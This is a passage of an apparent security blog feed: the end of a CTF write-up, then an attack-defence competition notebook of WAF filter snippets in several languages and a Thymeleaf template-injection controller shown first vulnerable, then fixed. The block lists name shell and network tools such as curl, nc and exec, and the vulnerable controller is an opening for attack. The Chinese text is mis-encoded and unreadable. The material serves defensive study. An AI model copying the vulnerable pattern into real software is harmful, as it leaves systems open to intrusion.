ï¼ˆå›½å¯†ï¼‰ä¸­æœ‰ä¸€ç§æ‚å‡‘ç®—æ³•(ä¹Ÿå«å“ˆå¸Œç®—æ³•)ï¼Œè¯·ç”¨è¯¥ç®—æ³•å¯¹å­—ç¬¦ä¸²â€œheidun2024â€è¿›è¡Œè¿ç®—ï¼Œå°†ç»“æœ(å°å†™åå…­è¿›åˆ¶å€¼)ä½œä¸ºæœ¬é¢˜ç­”æ¡ˆã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SM3åŠ å¯†ä¸éœ€è¦å¯†é’¥</p><p><img src="/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/image-20240622093453517.png" alt="image-20240622093453517"></p><hr><h2 id="æºç å’Œæ•°æ®éƒ½è¦ä¿æŠ¤ï¼ˆUnsolvedï¼‰"><a href="#æºç å’Œæ•°æ®éƒ½è¦ä¿æŠ¤ï¼ˆUnsolvedï¼‰" class="headerlink" title="æºç å’Œæ•°æ®éƒ½è¦ä¿æŠ¤ï¼ˆUnsolvedï¼‰"></a>æºç å’Œæ•°æ®éƒ½è¦ä¿æŠ¤ï¼ˆUnsolvedï¼‰</h2><p>æµ‹è¯•å‘ç°æ˜¯beaståŠ å¯†</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">function</span> <span class="token function-definition function">my_encode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token variable">$re</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span> <span class="token variable">$len</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$len</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">%</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token variable">$num</span><span class="token operator">-=</span><span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$re</span><span class="token operator">.=</span><span class="token operator">...</span><span class="token operator">...</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="æˆ‘çš„è¿›åˆ¶æˆ‘åšä¸»ï¼ˆUnsolvedï¼‰"><a href="#æˆ‘çš„è¿›åˆ¶æˆ‘åšä¸»ï¼ˆUnsolvedï¼‰" class="headerlink" title="æˆ‘çš„è¿›åˆ¶æˆ‘åšä¸»ï¼ˆUnsolvedï¼‰"></a>æˆ‘çš„è¿›åˆ¶æˆ‘åšä¸»ï¼ˆUnsolvedï¼‰</h2><p>é—®gptè¯´æ˜¯åå…«è¿›åˆ¶ï¼Œä½†æ˜¯æˆ‘æ²¡åšå‡ºæ¥ï¼</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;é‰´å®šä¸ºæ‰¾flagå¤§èµ›&lt;/p&gt;
&lt;p&gt;ç¬¬äºŒå¹´äº†è¿˜æ˜¯è¿›ä¸å»çº¿ä¸‹ï¼Œåªé è‡ªå·±çœŸæ˜¯ä¸€ç‚¹ä¹Ÿæ‰“ä¸ç©¿å•Šã€‚ã€‚&lt;/p&gt;
&lt;p&gt;å®˜æ–¹wpï¼š&lt;a href=&quot;https://heidunbei.si.net.cn/uploads/heiduncup/4c09bd8c1e4fb15d554413327e98513f.pdf&quot;&gt;https://heidunbei.si.net.cn/uploads/heiduncup/4c09bd8c1e4fb15d554413327e98513f.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;åˆç€å…¨æ˜¯543å‡ºçš„æ˜¯å§&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="RCE" scheme="http://c1oudfl0w0.github.io/blog/tags/RCE/"/>
    
    <category term="fuzz" scheme="http://c1oudfl0w0.github.io/blog/tags/fuzz/"/>
    
    <category term="Windows" scheme="http://c1oudfl0w0.github.io/blog/tags/Windows/"/>
    
    <category term="æ–‡ä»¶ä¸Šä¼ " scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>AWDPä¸ªäººçŸ¥è¯†åº“</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/21/AWDP%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/21/AWDP%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/</id>
    <published>2024-06-20T17:36:32.000Z</published>
    <updated>2024-08-08T08:37:43.794Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://fushuling.com/index.php/2023/06/01/awd/">https://fushuling.com/index.php/2023/06/01/awd/</a></p><p><a href="https://5ime.cn/awdp.html#nexmoe-content">https://5ime.cn/awdp.html#nexmoe-content</a></p><p><a href="https://hackerpoet.com/index.php/archives/988/">https://hackerpoet.com/index.php/archives/988/</a></p><span id="more"></span><hr><h1 id="Waf"><a href="#Waf" class="headerlink" title="Waf"></a>Waf</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">wafrce</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i"</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/passthru|system|tail|flag|exec|base64/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">wafsqli</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|>|&lt;|;|\"|\'|\^|\|/i"</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">wafxss</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\'|http|\"|\`|cookie|&lt;|>|script/i"</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ç›®å½•ç©¿è¶Š"><a href="#ç›®å½•ç©¿è¶Š" class="headerlink" title="ç›®å½•ç©¿è¶Š"></a>ç›®å½•ç©¿è¶Š</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$action</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'home.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">include</span> <span class="token variable">$action</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"File not found!"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$allowed_extensions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å…è®¸ä¸Šä¼ çš„æ–‡ä»¶åç¼€å</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è·å–æ–‡ä»¶åç¼€åå¹¶è½¬æ¢ä¸ºå°å†™</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token variable">$allowed_extensions</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// æ£€æŸ¥æ–‡ä»¶åç¼€åæ˜¯å¦åœ¨å…è®¸ä¸Šä¼ çš„åˆ—è¡¨ä¸­</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä¸å…è®¸ä¸Šä¼ è¯¥ç±»å‹çš„æ–‡ä»¶ï¼"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$target_file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ä¸ºä¸Šä¼ æ–‡ä»¶æŒ‡å®šç›®æ ‡è·¯å¾„</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å°†æ–‡ä»¶ä»ä¸´æ—¶ç›®å½•ç§»åŠ¨åˆ°ç›®æ ‡è·¯å¾„</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">filter_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">]</span>strings <span class="token operator">=</span> <span class="token string">"ana"</span>  <span class="token comment"># åŒ¹é…åŒ…å«"ana"çš„å­—ç¬¦ä¸²</span><span class="token keyword">for</span> i <span class="token keyword">in</span> filter_list<span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token keyword">in</span> strings<span class="token punctuation">:</span><span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"Hacker!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h2><p>è¿‡æ»¤åç¼€ï¼šå¦‚æœä¾èµ–é‡Œæœ‰ä¸Šä¼ ä¸­é—´ä»¶</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// é…ç½® multer ä¸Šä¼ ä¸­é—´ä»¶</span><span class="token keyword">const</span> upload <span class="token operator">=</span> <span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">storage</span><span class="token operator">:</span> storage<span class="token punctuation">,</span> <span class="token comment">// ä½¿ç”¨è‡ªå®šä¹‰å­˜å‚¨é€‰é¡¹</span>    <span class="token function-variable function">fileFilter</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> fileExt <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.ejs'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// å¦‚æœæ–‡ä»¶åç¼€ä¸º .ejsï¼Œåˆ™æ‹’ç»ä¸Šä¼ è¯¥æ–‡ä»¶</span>            <span class="token keyword">return</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Upload of .ejs files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.js'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// å¦‚æœæ–‡ä»¶åç¼€ä¸º .jsï¼Œåˆ™æ‹’ç»ä¸Šä¼ è¯¥æ–‡ä»¶</span>            <span class="token keyword">return</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Upload of .js files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å…è®¸ä¸Šä¼ å…¶ä»–ç±»å‹çš„æ–‡ä»¶</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿‡æ»¤ç›®å½•ç©¿è¶Šçš„åç¼€ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>newPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">app\.js|\\|\.ejs|node_modules</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>oldPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.\.|flag|node_modules</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>oldPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿‡æ»¤å…³é”®è¯ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token parameter">query</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>query<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">||</span> query<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"nc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"ç¦æ­¢ä½¿ç”¨ flag å’Œ nc å…³é”®å­—ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// æ‰§è¡Œæ­£å¸¸æ“ä½œ</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>æ£€æµ‹è§£ç åçš„payloadæ˜¯å¦å«æœ‰æ¶æ„ç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> sea <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>decodemsg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>sea<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.sea."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"filtered"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="thymeleaf-ssti"><a href="#thymeleaf-ssti" class="headerlink" title="thymeleaf ssti"></a>thymeleaf ssti</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AboutController</span> <span class="token punctuation">&#123;</span>  <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/about"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">about</span><span class="token punctuation">(</span><span class="token class-name">HttpSession</span> session<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token class-name">String</span> type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token string">"about/tourist/about"</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token string">"about/"</span> <span class="token operator">+</span> type <span class="token operator">+</span> <span class="token string">"/about"</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token string">"about/user/about"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fixç‰ˆæœ¬ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AboutController</span> <span class="token punctuation">&#123;</span>  <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/about"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">about</span><span class="token punctuation">(</span><span class="token class-name">HttpSession</span> session<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token class-name">String</span> type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token string">"about/tourist/about"</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"about/system/about"</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"tourist"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"about/tourist/about"</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token 